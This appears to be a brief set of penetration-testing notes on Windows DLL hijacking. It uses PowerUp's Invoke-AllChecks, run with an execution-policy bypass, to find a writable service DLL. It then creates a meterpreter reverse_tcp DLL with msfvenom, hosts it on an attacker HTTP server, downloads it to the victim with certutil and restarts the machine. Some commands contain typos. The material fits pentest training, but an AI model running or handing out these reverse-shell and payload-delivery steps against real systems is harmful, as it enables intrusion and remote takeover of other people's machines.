# 🗒 DLL Hijacking

DLLs are dynamic libraries that a program needs to run, this could be images, and commands.&#x20;

How do we perform DLL hijacking?

As the name entails we will be hijacking a DLL by overwriting an already exsiting one. In order to see whether a DLL is hijackable I run PowerUp.ps1 and use the function Invoke-AllChecks in order to enumerate for Unquoted Service Paths and DLL hijackable dlls.&#x20;

```
powershell -ep bypass 
. .\PowerUp.ps1
Invoke-AllChecks
```

![](<../../../.gitbook/assets/image (24).png>)

In this example we see that the vulnerable DLL file is called wlbsctrl.dll, so if we have write access to this file we can overwrite it with a malicious payload of our own in the dll form.&#x20;

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.123.123.123 lport=1234 -f dll -o wlbsctrl.dll

/* We start an http server
pyhon3 -m http.server 80

On victim machine
certutil -urlcache -f htto://192.123.123.123:80/wlbsctrl.dll "C:\path\to\wlbsctrl.dll"

/* Restart Victim machine. 
shutdown -r 
```

![](<../../../.gitbook/assets/image (60).png>)
